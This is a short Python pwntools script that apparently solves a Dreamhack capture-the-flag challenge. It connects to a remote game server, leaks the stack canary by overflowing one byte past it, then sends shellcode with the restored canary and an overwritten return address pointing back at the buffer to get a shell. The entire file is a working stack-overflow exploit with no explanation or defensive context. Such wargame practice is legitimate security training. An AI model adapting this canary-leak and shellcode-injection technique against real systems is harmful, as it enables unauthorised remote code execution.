from pwn import *
context.arch = 'amd64'

# buf: [rbp-0x60], canary: [rbp - 0x8]

p = remote('host3.dreamhack.games', 20851)
shellcode = asm(shellcraft.sh())
def slog(n, m) :
    return success(": ".join([n, hex(m)]))

p.recvuntil(b'Address of the buf: ')
address_buf = int(p.recv(14), 16)
p.recvuntil(b'Distance between buf and $rbp: ')
buf2sfp = int(p.recvline().split()[0])
buf2canary = buf2sfp - 0x8

slog('buf<=>canary', buf2canary)
slog('address of buf', address_buf)

payload = b'A' * (buf2canary + 1)
p.sendafter(b'Input: ', payload)

p.recvuntil(payload)
canary = u64(b'\x00' + p.recvn(7))
slog('canary', canary)

payload = shellcode
payload += b'A' * (buf2canary - len(shellcode))
payload += p64(canary)
payload += b'B' * 0x8
payload += p64(address_buf)

p.sendafter(b'Input: ', payload)

p.interactive()